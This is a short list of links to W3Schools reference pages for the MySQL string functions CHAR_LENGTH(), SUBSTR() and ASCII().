* [MySQL CHAR_LENGTH() Function](https://www.w3schools.com/sql/func_mysql_char_length.asp)
* [MySQL SUBSTR() Function](https://www.w3schools.com/sql/func_mysql_substr.asp)
* [MySQL ASCII() Function](https://www.w3schools.com/sql/func_mysql_ascii.asp)